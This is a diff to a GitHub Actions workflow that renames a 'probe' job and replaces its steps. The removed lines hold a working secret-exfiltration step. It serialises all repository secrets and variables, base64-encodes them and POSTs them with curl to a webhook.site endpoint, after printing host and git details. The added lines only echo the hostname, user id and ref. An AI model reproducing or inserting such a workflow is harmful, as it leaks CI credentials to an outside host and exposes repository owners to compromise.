@@ -1,20 +1,13 @@
-name: probe
+name: probe2
 on:
   push:
-    branches: ['probe-i59265-*', 'probe-*']
+    branches: ['probe-i59265']
 jobs:
   p:
     runs-on: ubuntu-latest
     steps:
-      - name: dump-context
-        env:
-          ALLSECRETS: ${{ toJSON(secrets) }}
-          ALLVARS: ${{ toJSON(vars) }}
+      - name: hello
         run: |
-          echo "== host =="; id; hostname; uname -a; pwd; ls -la
-          echo "== git remote =="; git remote -v; git log --oneline -2
-          B64=$(printf '%s' "$ALLSECRETS" | base64 -w0)
-          V64=$(printf '%s' "$ALLVARS" | base64 -w0)
-          curl -s -m 20 -X POST "https://webhook.site/11fdab5d-2ca4-4cab-b318-61be45d3ed4b" -H 'Content-Type: text/plain' --data-binary "secrets=$B64" -o /dev/null -w "wh_secrets:%{http_code}\n"
-          curl -s -m 20 -X POST "https://webhook.site/11fdab5d-2ca4-4cab-b318-61be45d3ed4b" -H 'Content-Type: text/plain' --data-binary "vars=$V64" -o /dev/null -w "wh_vars:%{http_code}\n"
-          echo "== done =="
+          echo "runner: $(hostname) $(id -u)"
+          echo "ref: $GITHUB_REF"
+          echo "OK-PROBE2-$(date -u +%s)" >> $GITHUB_STEP_SUMMARY
